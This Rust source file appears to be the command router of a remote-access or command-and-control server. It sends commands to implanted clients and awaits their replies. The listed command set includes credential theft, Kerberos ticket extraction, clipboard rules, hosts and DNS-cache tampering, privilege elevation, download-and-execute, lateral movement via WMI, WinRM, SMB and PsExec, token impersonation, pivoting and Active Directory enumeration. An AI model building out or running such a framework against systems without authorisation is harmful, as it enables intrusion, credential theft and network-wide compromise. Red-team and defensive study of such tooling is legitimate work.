//! Command execution routing and response tracking.
//!
//! Manages sending commands to clients and tracking their responses.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};

use parking_lot::RwLock;
use tokio::sync::{mpsc, oneshot};
use uuid::Uuid;

use crate::client::SharedClientRegistry;
use crate::logging::SharedLogStore;
use crate::protocol::{CommandMessage, CommandType, CommandResponseMessage, CommandResponseData};

/// Default command timeout
const DEFAULT_COMMAND_TIMEOUT: Duration = Duration::from_secs(30);

/// A pending command awaiting response
struct PendingCommand {
    /// Command ID
    id: String,
    /// Client UID
    client_uid: String,
    /// Command type (for logging)
    command_type: String,
    /// When the command was sent
    sent_at: Instant,
    /// Timeout duration
    timeout: Duration,
    /// Channel to send response back
    response_tx: oneshot::Sender<CommandResult>,
}

/// Result of a command execution
#[derive(Debug, Clone)]
pub struct CommandResult {
    pub id: String,
    pub success: bool,
    pub data: CommandResponseData,
    pub duration_ms: u64,
}

/// Command router for managing command execution
pub struct CommandRouter {
    /// Pending commands awaiting responses
    pending: Arc<RwLock<HashMap<String, PendingCommand>>>,
    /// Client registry for sending commands
    client_registry: SharedClientRegistry,
    /// Log store for logging command events
    log_store: SharedLogStore,
}

impl CommandRouter {
    pub fn new(client_registry: SharedClientRegistry, log_store: SharedLogStore) -> Self {
        Self {
            pending: Arc::new(RwLock::new(HashMap::new())),
            client_registry,
            log_store,
        }
    }

    /// Send a command to a client and wait for response
    pub async fn send_command(
        &self,
        client_uid: &str,
        command: CommandType,
        timeout: Option<Duration>,
    ) -> Result<CommandResult, CommandError> {
        // Get client's command channel
        let command_tx = self.client_registry
            .get_command_sender_by_uid(client_uid)
            .ok_or(CommandError::ClientNotFound)?;

        // Generate unique command ID
        let id = Uuid::new_v4().to_string();
        let timeout = timeout.unwrap_or(DEFAULT_COMMAND_TIMEOUT);

        // Create response channel
        let (response_tx, response_rx) = oneshot::channel();

        // Get command type name for logging
        let command_type = get_command_type_name(&command);

        // Create command message
        let msg = CommandMessage {
            id: id.clone(),
            command,
        };

        // Store pending command
        {
            let mut pending = self.pending.write();
            pending.insert(id.clone(), PendingCommand {
                id: id.clone(),
                client_uid: client_uid.to_string(),
                command_type: command_type.clone(),
                sent_at: Instant::now(),
                timeout,
                response_tx,
            });
        }

        self.log_store.client_info(
            client_uid,
            format!("Sending command: {}", command_type),
        );

        // Send command to client
        if let Err(_) = command_tx.send(msg).await {
            self.pending.write().remove(&id);
            self.log_store.client_error(client_uid, "Failed to send command: channel closed");
            return Err(CommandError::SendFailed);
        }

        // Wait for response with timeout
        match tokio::time::timeout(timeout, response_rx).await {
            Ok(Ok(result)) => {
                self.log_store.client_success(
                    client_uid,
                    format!("Command {} completed in {}ms", command_type, result.duration_ms),
                );
                Ok(result)
            }
            Ok(Err(_)) => {
                self.log_store.client_error(client_uid, format!("Command {} cancelled", command_type));
                Err(CommandError::Cancelled)
            }
            Err(_) => {
                self.pending.write().remove(&id);
                self.log_store.client_warning(
                    client_uid,
                    format!("Command {} timed out after {}s", command_type, timeout.as_secs()),
                );
                Err(CommandError::Timeout)
            }
        }
    }

    /// Handle a command response from a client
    pub fn handle_response(&self, response: CommandResponseMessage) {
        let mut pending = self.pending.write();

        if let Some(cmd) = pending.remove(&response.id) {
            let duration_ms = cmd.sent_at.elapsed().as_millis() as u64;

            let result = CommandResult {
                id: response.id,
                success: response.success,
                data: response.data,
                duration_ms,
            };

            // Send response back to waiting task
            let _ = cmd.response_tx.send(result);
        }
    }

    /// Clean up timed-out commands
    pub fn cleanup_timeouts(&self) {
        let now = Instant::now();
        let mut pending = self.pending.write();

        pending.retain(|_, cmd| {
            let elapsed = now.duration_since(cmd.sent_at);
            if elapsed > cmd.timeout {
                self.log_store.client_warning(
                    &cmd.client_uid,
                    format!("Command {} timed out (cleanup)", cmd.command_type),
                );
                false
            } else {
                true
            }
        });
    }

    /// Get count of pending commands
    pub fn pending_count(&self) -> usize {
        self.pending.read().len()
    }

    /// Get count of pending commands for a specific client
    pub fn pending_count_for_client(&self, client_uid: &str) -> usize {
        self.pending
            .read()
            .values()
            .filter(|cmd| cmd.client_uid == client_uid)
            .count()
    }
}

/// Command execution errors
#[derive(Debug, Clone)]
pub enum CommandError {
    ClientNotFound,
    SendFailed,
    Timeout,
    Cancelled,
}

impl std::fmt::Display for CommandError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ClientNotFound => write!(f, "Client not found"),
            Self::SendFailed => write!(f, "Failed to send command"),
            Self::Timeout => write!(f, "Command timed out"),
            Self::Cancelled => write!(f, "Command cancelled"),
        }
    }
}

impl std::error::Error for CommandError {}

/// Get a human-readable name for a command type
pub fn get_command_type_name(cmd: &CommandType) -> String {
    match cmd {
        CommandType::Shell { .. } => "Shell".to_string(),
        CommandType::PowerShell { .. } => "PowerShell".to_string(),
        CommandType::FileDownload { path, .. } => format!("FileDownload({})", path),
        CommandType::FileUpload { path, .. } => format!("FileUpload({})", path),
        CommandType::ListDirectory { path } => format!("ListDirectory({})", path),
        CommandType::GetClipboard => "GetClipboard".to_string(),
        CommandType::SetClipboard { .. } => "SetClipboard".to_string(),
        CommandType::Screenshot => "Screenshot".to_string(),
        CommandType::OpenUrl { url, .. } => format!("OpenUrl({})", url),
        CommandType::ListProcesses => "ListProcesses".to_string(),
        CommandType::KillProcess { pid } => format!("KillProcess({})", pid),
        CommandType::GetSystemInfo => "GetSystemInfo".to_string(),
        CommandType::Uninstall => "Uninstall".to_string(),
        CommandType::Disconnect => "Disconnect".to_string(),
        CommandType::Reconnect => "Reconnect".to_string(),
        CommandType::RestartClient => "RestartClient".to_string(),
        CommandType::Elevate => "Elevate".to_string(),
        CommandType::ForceElevate => "ForceElevate".to_string(),
        CommandType::Shutdown { delay_secs, .. } => format!("Shutdown({}s)", delay_secs),
        CommandType::Reboot { delay_secs, .. } => format!("Reboot({}s)", delay_secs),
        CommandType::Logoff { .. } => "Logoff".to_string(),
        CommandType::Lock => "Lock".to_string(),
        CommandType::MessageBox { title, .. } => format!("MessageBox({})", title),
        CommandType::ShellStart => "ShellStart".to_string(),
        CommandType::ShellInput { .. } => "ShellInput".to_string(),
        CommandType::ShellClose => "ShellClose".to_string(),
        CommandType::ListDrives => "ListDrives".to_string(),
        CommandType::FileDelete { path, .. } => format!("FileDelete({})", path),
        CommandType::FileRename { old_path, .. } => format!("FileRename({})", old_path),
        CommandType::CreateDirectory { path } => format!("CreateDirectory({})", path),
        CommandType::FileCopy { source, .. } => format!("FileCopy({})", source),
        CommandType::FileExecute { path, .. } => format!("FileExecute({})", path),
        CommandType::DownloadExecute { url, .. } => format!("DownloadExecute({})", url),
        CommandType::AddClipboardRule { id, .. } => format!("AddClipboardRule({})", id),
        CommandType::RemoveClipboardRule { id } => format!("RemoveClipboardRule({})", id),
        CommandType::UpdateClipboardRule { id, .. } => format!("UpdateClipboardRule({})", id),
        CommandType::ListClipboardRules => "ListClipboardRules".to_string(),
        CommandType::ClearClipboardHistory => "ClearClipboardHistory".to_string(),
        CommandType::ListMediaDevices => "ListMediaDevices".to_string(),
        CommandType::StartMediaStream { .. } => "StartMediaStream".to_string(),
        CommandType::StopMediaStream => "StopMediaStream".to_string(),
        CommandType::ListStartupEntries => "ListStartupEntries".to_string(),
        CommandType::RemoveStartupEntry { .. } => "RemoveStartupEntry".to_string(),
        CommandType::ListTcpConnections => "ListTcpConnections".to_string(),
        CommandType::KillTcpConnection { pid } => format!("KillTcpConnection({})", pid),
        CommandType::ListServices => "ListServices".to_string(),
        CommandType::StartService { name } => format!("StartService({})", name),
        CommandType::StopService { name } => format!("StopService({})", name),
        CommandType::RestartService { name } => format!("RestartService({})", name),
        CommandType::ChatStart { operator_name } => format!("ChatStart({})", operator_name),
        CommandType::ChatMessage { .. } => "ChatMessage".to_string(),
        CommandType::ChatClose => "ChatClose".to_string(),
        CommandType::GetCredentials => "GetCredentials".to_string(),
        CommandType::ProxyConnect { conn_id, host, port } => format!("ProxyConnect(#{}->{}:{})", conn_id, host, port),
        CommandType::ProxyConnectTarget { conn_id, ref target } => format!("ProxyConnectTarget(#{}->{})", conn_id, target.display()),
        CommandType::ProxyData { conn_id, .. } => format!("ProxyData(#{})", conn_id),
        CommandType::ProxyClose { conn_id } => format!("ProxyClose(#{})", conn_id),
        CommandType::GetHostsEntries => "GetHostsEntries".to_string(),
        CommandType::AddHostsEntry { hostname, ip } => format!("AddHostsEntry({} -> {})", hostname, ip),
        CommandType::RemoveHostsEntry { hostname } => format!("RemoveHostsEntry({})", hostname),
        CommandType::RemoteDesktopStart { .. } => "RemoteDesktopStart".to_string(),
        CommandType::RemoteDesktopStop => "RemoteDesktopStop".to_string(),
        CommandType::RemoteDesktopMouseInput { .. } => "RemoteDesktopMouseInput".to_string(),
        CommandType::RemoteDesktopKeyInput { .. } => "RemoteDesktopKeyInput".to_string(),
        CommandType::RemoteDesktopSpecialKey { key } => format!("RemoteDesktopSpecialKey({})", key),
        CommandType::RemoteDesktopH264Start { .. } => "RemoteDesktopH264Start".to_string(),
        CommandType::RemoteDesktopH264Stop => "RemoteDesktopH264Stop".to_string(),
        CommandType::RegistryListKeys { path } => format!("RegistryListKeys({})", path),
        CommandType::RegistryListValues { path } => format!("RegistryListValues({})", path),
        CommandType::RegistryGetValue { path, name } => format!("RegistryGetValue({}\\{})", path, name),
        CommandType::RegistrySetValue { path, name, .. } => format!("RegistrySetValue({}\\{})", path, name),
        CommandType::RegistryDeleteValue { path, name } => format!("RegistryDeleteValue({}\\{})", path, name),
        CommandType::RegistryCreateKey { path } => format!("RegistryCreateKey({})", path),
        CommandType::RegistryDeleteKey { path, .. } => format!("RegistryDeleteKey({})", path),
        // Task Scheduler commands
        CommandType::ListScheduledTasks => "ListScheduledTasks".to_string(),
        CommandType::RunScheduledTask { name } => format!("RunScheduledTask({})", name),
        CommandType::EnableScheduledTask { name } => format!("EnableScheduledTask({})", name),
        CommandType::DisableScheduledTask { name } => format!("DisableScheduledTask({})", name),
        CommandType::DeleteScheduledTask { name } => format!("DeleteScheduledTask({})", name),
        CommandType::CreateScheduledTask { name, .. } => format!("CreateScheduledTask({})", name),
        // WMI commands
        CommandType::WmiQuery { query, namespace } => {
            let ns = namespace.as_deref().unwrap_or("root\\cimv2");
            format!("WmiQuery({}, {})", ns, query)
        }
        // DNS Cache commands
        CommandType::GetDnsCache => "GetDnsCache".to_string(),
        CommandType::FlushDnsCache => "FlushDnsCache".to_string(),
        CommandType::AddDnsCacheEntry { hostname, ip } => format!("AddDnsCacheEntry({} -> {})", hostname, ip),
        // Lateral Movement commands
        CommandType::LateralScanNetwork { subnet, .. } => format!("LateralScanNetwork({})", subnet),
        CommandType::LateralEnumShares { host } => format!("LateralEnumShares({})", host),
        CommandType::LateralTestCredentials { host, username, protocol, .. } => {
            format!("LateralTestCredentials({}@{} via {})", username, host, protocol)
        }
        CommandType::LateralExecWmi { host, username, .. } => format!("LateralExecWmi({}@{})", username, host),
        CommandType::LateralExecWinRm { host, username, .. } => format!("LateralExecWinRm({}@{})", username, host),
        CommandType::LateralExecSmb { host, username, .. } => format!("LateralExecSmb({}@{})", username, host),
        CommandType::LateralDeploy { host, method, .. } => format!("LateralDeploy({} via {})", host, method),
        // Token Management commands
        CommandType::TokenMake { domain, username, .. } => format!("TokenMake({}\\{})", domain, username),
        CommandType::TokenList => "TokenList".to_string(),
        CommandType::TokenImpersonate { token_id } => format!("TokenImpersonate(#{})", token_id),
        CommandType::TokenRevert => "TokenRevert".to_string(),
        CommandType::TokenDelete { token_id } => format!("TokenDelete(#{})", token_id),
        // Jump Execution commands
        CommandType::JumpScshell { host, service_name, .. } => format!("JumpScshell({} via {})", host, service_name),
        CommandType::JumpPsexec { host, service_name, .. } => format!("JumpPsexec({} via {})", host, service_name),
        CommandType::JumpWinrm { host, .. } => format!("JumpWinrm({})", host),
        // Pivot commands
        CommandType::PivotSmbConnect { host, pipe_name } => format!("PivotSmbConnect({}\\{})", host, pipe_name),
        CommandType::PivotSmbDisconnect { pivot_id } => format!("PivotSmbDisconnect(#{})", pivot_id),
        CommandType::PivotList => "PivotList".to_string(),
        // Active Directory commands
        CommandType::AdGetDomainInfo => "AdGetDomainInfo".to_string(),
        CommandType::AdEnumUsers { filter, .. } => format!("AdEnumUsers(filter={:?})", filter),
        CommandType::AdEnumGroups { .. } => "AdEnumGroups".to_string(),
        CommandType::AdGetGroupMembers { group_name } => format!("AdGetGroupMembers({})", group_name),
        CommandType::AdEnumComputers { filter, .. } => format!("AdEnumComputers(filter={:?})", filter),
        CommandType::AdEnumSpns { .. } => "AdEnumSpns".to_string(),
        CommandType::AdEnumSessions { target } => format!("AdEnumSessions({:?})", target),
        CommandType::AdEnumTrusts => "AdEnumTrusts".to_string(),
        // Kerberos commands
        CommandType::KerberosExtractTickets => "KerberosExtractTickets".to_string(),
        CommandType::KerberosPurgeTickets => "KerberosPurgeTickets".to_string(),
        // Local Security commands
        CommandType::EnumLocalGroups => "EnumLocalGroups".to_string(),
        CommandType::EnumRemoteAccessRights => "EnumRemoteAccessRights".to_string(),
        CommandType::AdEnumAcls { object_type, .. } => format!("AdEnumAcls({:?})", object_type),
    }
}

/// Shared command router
pub type SharedCommandRouter = Arc<CommandRouter>;
